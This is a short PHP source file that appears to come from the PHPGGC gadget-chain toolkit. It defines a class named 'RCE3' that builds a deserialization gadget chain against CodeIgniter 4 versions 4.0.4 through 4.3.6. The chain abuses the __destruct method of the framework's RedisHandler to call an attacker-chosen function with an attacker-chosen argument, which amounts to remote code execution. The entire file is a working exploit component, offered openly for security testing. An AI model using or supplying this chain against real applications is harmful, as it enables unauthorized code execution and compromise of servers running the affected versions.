<?php

namespace GadgetChain\CodeIgniter4;

class RCE3 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '4.0.4 <= 4.3.6';
    public static $vector = '__destruct';
    public static $author = 'Firebasky';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \CodeIgniter\Cache\Handlers\RedisHandler($function, $parameter);
    }
}
